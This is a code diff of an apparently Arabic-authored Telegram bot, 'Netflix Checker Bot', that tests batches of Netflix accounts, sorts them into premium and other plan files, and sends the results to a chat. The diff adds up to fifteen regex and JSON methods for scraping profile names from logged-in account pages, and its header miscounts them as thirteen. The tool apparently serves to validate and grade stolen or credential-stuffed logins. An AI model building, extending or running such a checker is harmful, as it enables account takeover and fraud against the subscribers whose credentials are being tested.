@@ -1,4 +1,4 @@
-# NF.py - نسخة Railway (Async + Cancel فوري)
+# NF.py - نسخة Railway (Async + Cancel فوري + 13 طريقة للبروفايلات)
 import os
 import re
 import json
@@ -355,7 +355,7 @@ def extract_payment_method(html_content):
 
     return None
 
-# ======================== دوال استخراج البروفايلات (10 طرق) ========================
+# ======================== دوال استخراج البروفايلات (13 طريقة) ========================
 async def extract_all_profiles_from_manage(session):
     profiles = []
 
@@ -382,115 +382,222 @@ async def extract_all_profiles_from_manage(session):
             return False
         return True
 
-    try:
-        async with session.get("https://www.netflix.com/ManageProfiles", allow_redirects=True) as resp:
-            if resp.status != 200:
-                return profiles
-            html_content = await resp.text()
+    async def extract_from_page(url):
+        """دالة مساعدة لاستخراج البروفايلات من صفحة معينة"""
+        page_profiles = []
+        try:
+            async with session.get(url, allow_redirects=True) as resp:
+                if resp.status != 200:
+                    return page_profiles
+                html_content = await resp.text()
 
-        # الطريقة 1: JSON "profiles" array
-        profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
-        if profiles_match:
-            profiles_data = profiles_match.group(1)
-            all_names = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_data)
-            for name in all_names:
-                decoded = decode_value(name)
-                if is_valid_profile(decoded) and decoded not in profiles:
-                    profiles.append(decoded)
+            # لو الصفحة صفحة تسجيل دخول، نرجع فاضي
+            if "signin" in html_content.lower()[:2000] and "logout" not in html_content.lower():
+                return page_profiles
 
-        # الطريقة 2: "profileName"
-        profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
-        for match in profile_matches:
-            pname = decode_value(match.group(1))
-            if is_valid_profile(pname) and pname not in profiles:
-                profiles.append(pname)
+            # ============ الطرق الأساسية ============
 
-        # الطريقة 3: profiles array + name
-        if not profiles:
-            alt_matches = re.finditer(r'"profiles"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', html_content, re.DOTALL)
-            for match in alt_matches:
+            # الطريقة 1: JSON "profiles" array
+            profiles_match = re.search(r'"profiles"\s*:\s*\[(.*?)\](?=\s*[,\}])', html_content, re.DOTALL)
+            if profiles_match:
+                profiles_data = profiles_match.group(1)
+                all_names = re.findall(r'"name"\s*:\s*"([^"]+)"', profiles_data)
+                for name in all_names:
+                    decoded = decode_value(name)
+                    if is_valid_profile(decoded) and decoded not in page_profiles:
+                        page_profiles.append(decoded)
+
+            # الطريقة 2: "profileName"
+            profile_matches = re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html_content)
+            for match in profile_matches:
                 pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+                if is_valid_profile(pname) and pname not in page_profiles:
+                    page_profiles.append(pname)
 
-        # الطريقة 4: class profile-name
-        profile_classes = [
-            r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
-            r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
-            r'<a[^>]*class="[^"]*profile-link[^"]*"[^>]*>([^<]+)</a>',
-            r'<div[^>]*data-profile-name[^>]*>([^<]+)</div>',
-            r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
-            r'<div[^>]*aria-label="Profile[^"]*"[^>]*>([^<]+)</div>',
-            r'<h1[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h1>',
-            r'<h2[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h2>',
-        ]
+            # الطريقة 3: profiles array + name
+            if not page_profiles:
+                alt_matches = re.finditer(r'"profiles"\s*:\s*\[.*?"name"\s*:\s*"([^"]+)"', html_content, re.DOTALL)
+                for match in alt_matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        for pattern in profile_classes:
-            matches = re.finditer(pattern, html_content, re.IGNORECASE)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            # الطريقة 4: class profile-name / data-uia
+            profile_classes = [
+                r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>',
+                r'<div[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</div>',
+                r'<a[^>]*class="[^"]*profile-link[^"]*"[^>]*>([^<]+)</a>',
+                r'<div[^>]*data-profile-name[^>]*>([^<]+)</div>',
+                r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
+                r'<div[^>]*aria-label="Profile[^"]*"[^>]*>([^<]+)</div>',
+                r'<h1[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h1>',
+                r'<h2[^>]*class="[^"]*profile[^"]*"[^>]*>([^<]+)</h2>',
+                # ✅ طرق إضافية خاصة بصفحة /account/profiles
+                r'<span[^>]*data-uia="profile-avatar-name"[^>]*>([^<]+)</span>',
+                r'<div[^>]*class="[^"]*profile-avatar[^"]*"[^>]*>.*?<span[^>]*>([^<]+)</span>',
+                r'<p[^>]*class="[^"]*profile[^"]*name[^"]*"[^>]*>([^<]+)</p>',
+                r'<span[^>]*class="[^"]*profileName[^"]*"[^>]*>([^<]+)</span>',
+            ]
 
-        # الطريقة 5: profileId + name
-        if not profiles:
-            alt_pattern = r'"profileId"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
-            matches = re.finditer(alt_pattern, html_content)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            for pattern in profile_classes:
+                matches = re.finditer(pattern, html_content, re.IGNORECASE | re.DOTALL)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        # الطريقة 6: profileGuid + name
-        if not profiles:
-            alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
-            matches = re.finditer(alt_pattern2, html_content)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            # الطريقة 5: profileId + name
+            if not page_profiles:
+                alt_pattern = r'"profileId"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
+                matches = re.finditer(alt_pattern, html_content)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        # الطريقة 7: profile + name
-        if not profiles:
-            alt_pattern3 = r'profile[^}]*?"name"\s*:\s*"([^"]+)"'
-            matches = re.finditer(alt_pattern3, html_content, re.IGNORECASE | re.DOTALL)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            # الطريقة 6: profileGuid + name
+            if not page_profiles:
+                alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
+                matches = re.finditer(alt_pattern2, html_content)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        # الطريقة 8: alt + data-uia
-        if not profiles:
-            alt_pattern4 = r'alt="([^"]+)"[^>]*data-uia="profile'
-            matches = re.finditer(alt_pattern4, html_content)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            # الطريقة 7: profile + name
+            if not page_profiles:
+                alt_pattern3 = r'profile[^}]*?"name"\s*:\s*"([^"]+)"'
+                matches = re.finditer(alt_pattern3, html_content, re.IGNORECASE | re.DOTALL)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        # الطريقة 9: option tags
-        if not profiles:
-            alt_pattern5 = r'<option[^>]*value="[^"]*"[^>]*>([^<]+)</option>'
-            matches = re.finditer(alt_pattern5, html_content, re.IGNORECASE)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            # الطريقة 8: alt + data-uia
+            if not page_profiles:
+                alt_pattern4 = r'alt="([^"]+)"[^>]*data-uia="profile'
+                matches = re.finditer(alt_pattern4, html_content)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        # الطريقة 10: aria-label Switch Profile
-        if not profiles:
-            alt_pattern6 = r'aria-label="[^"]*Profile[^"]*:\s*([^"]+)"'
-            matches = re.finditer(alt_pattern6, html_content, re.IGNORECASE)
-            for match in matches:
-                pname = decode_value(match.group(1))
-                if is_valid_profile(pname) and pname not in profiles:
-                    profiles.append(pname)
+            # الطريقة 9: option tags
+            if not page_profiles:
+                alt_pattern5 = r'<option[^>]*value="[^"]*"[^>]*>([^<]+)</option>'
+                matches = re.finditer(alt_pattern5, html_content, re.IGNORECASE)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-        profiles = list(dict.fromkeys(profiles))
-        profiles = [p for p in profiles if is_valid_profile(p)]
+            # الطريقة 10: aria-label Switch Profile
+            if not page_profiles:
+                alt_pattern6 = r'aria-label="[^"]*Profile[^"]*:\s*([^"]+)"'
+                matches = re.finditer(alt_pattern6, html_content, re.IGNORECASE)
+                for match in matches:
+                    pname = decode_value(match.group(1))
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
 
-    except Exception as e:
-        pass
+            # ============ ✅ طرق جديدة خاصة بـ /account/profiles ============
+
+            # الطريقة 11: "profileName" في JSON جوه <script>
+            if not page_profiles:
+                script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.DOTALL)
+                for script in script_matches:
+                    if 'profile' in script.lower():
+                        names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', script)
+                        for n in names:
+                            pname = decode_value(n)
+                            if is_valid_profile(pname) and pname not in page_profiles:
+                                page_profiles.append(pname)
+
+            # الطريقة 12: "name" جوه أي object فيه "profile" أو "avatar"
+            if not page_profiles:
+                json_blocks = re.findall(r'\{[^{}]*"profile[^{}]*\}', html_content, re.IGNORECASE)
+                for block in json_blocks:
+                    names = re.findall(r'"name"\s*:\s*"([^"]+)"', block)
+                    for n in names:
+                        pname = decode_value(n)
+                        if is_valid_profile(pname) and pname not in page_profiles:
+                            page_profiles.append(pname)
+
+            # الطريقة 13: أسماء جوه data attributes
+            if not page_profiles:
+                data_names = re.findall(r'data-[a-z-]*name="([^"]+)"', html_content, re.IGNORECASE)
+                for n in data_names:
+                    pname = decode_value(n)
+                    if is_valid_profile(pname) and pname not in page_profiles:
+                        page_profiles.append(pname)
+
+            # الطريقة 14: JSON.parse من __NEXT_DATA__ أو initialState
+            if not page_profiles:
+                next_data_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>', html_content, re.DOTALL)
+                if next_data_match:
+                    try:
+                        next_data = json.loads(next_data_match.group(1))
+                        names = _find_profile_names_in_json(next_data)
+                        for n in names:
+                            pname = decode_value(n)
+                            if is_valid_profile(pname) and pname not in page_profiles:
+                                page_profiles.append(pname)
+                    except:
+                        pass
+
+            # الطريقة 15: netflix react context
+            if not page_profiles:
+                react_match = re.search(r'netflix\.react\.context\s*=\s*(\{.*?\});', html_content, re.DOTALL)
+                if react_match:
+                    try:
+                        ctx = json.loads(react_match.group(1))
+                        names = _find_profile_names_in_json(ctx)
+                        for n in names:
+                            pname = decode_value(n)
+                            if is_valid_profile(pname) and pname not in page_profiles:
+                                page_profiles.append(pname)
+                    except:
+                        pass
+
+        except Exception as e:
+            pass
+
+        return page_profiles
+
+    def _find_profile_names_in_json(obj, depth=0):
+        """دالة recursive للبحث عن أسماء البروفايلات جوه JSON"""
+        names = []
+        if depth > 10:
+            return names
+        try:
+            if isinstance(obj, dict):
+                # لو الـ dict ده فيه profile أو avatar
+                keys_lower = [str(k).lower() for k in obj.keys()]
+                is_profile_obj = any('profile' in k or 'avatar' in k for k in keys_lower)
+
+                if is_profile_obj:
+                    for key in ['name', 'profileName', 'displayName']:
+                        if key in obj and isinstance(obj[key], str):
+                            names.append(obj[key])
+
+                for v in obj.values():
+                    names.extend(_find_profile_names_in_json(v, depth + 1))
+            elif isinstance(obj, list):
+                for item in obj:
+                    names.extend(_find_profile_names_in_json(item, depth + 1))
+        except:
+            pass
+        return names
+
+    # ✅ نجرب الصفحتين بالترتيب
+    profiles = await extract_from_page("https://www.netflix.com/ManageProfiles")
+
+    if not profiles:
+        profiles = await extract_from_page("https://www.netflix.com/account/profiles")
+
+    # تنظيف نهائي
+    profiles = list(dict.fromkeys(profiles))
+    profiles = [p for p in profiles if is_valid_profile(p)]
 
     return profiles
 
@@ -946,11 +1053,11 @@ async def update_progress(context):
     except:
         pass
 
-async def send_partial_results(context, chat_id, reason="cancelled"):
+async def send_partial_results(context, chat_id_param, reason="cancelled"):
     global results, total_accounts, processed
 
     if not results:
-        await context.bot.send_message(chat_id, "⚠️ No results to show.")
+        await context.bot.send_message(chat_id_param, "⚠️ No results to show.")
         return
 
     premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
@@ -973,7 +1080,7 @@ async def send_partial_results(context, chat_id, reason="cancelled"):
         f"   ├─ 📱 Mobile: {mobile}\n"
         f"   └─ ❌ Invalid/Free: {invalid}"
     )
-    await context.bot.send_message(chat_id, result_text)
+    await context.bot.send_message(chat_id_param, result_text)
 
     plan_files = {
         "premium": "PREMIUM_ACCOUNTS.txt",
@@ -996,7 +1103,7 @@ async def send_partial_results(context, chat_id, reason="cancelled"):
         try:
             encoded_content = content.encode("utf-8", errors="ignore")
             await context.bot.send_document(
-                chat_id=chat_id,
+                chat_id=chat_id_param,
                 document=BytesIO(encoded_content),
                 filename=out_filename
             )
@@ -1402,8 +1509,8 @@ def main():
     print("=" * 50)
     print("✅ Netflix Checker Bot is running...")
     print("✅ Async mode - /cancel responds INSTANTLY")
-    print("✅ Enhanced profile extraction (10 methods)")
-    print("✅ Account status shown in results")
+    print("✅ Enhanced profile extraction (15 methods)")
+    print("✅ Supports /ManageProfiles & /account/profiles")
     print("=" * 50)
 
     app.run_polling(allowed_updates=Update.ALL_TYPES)
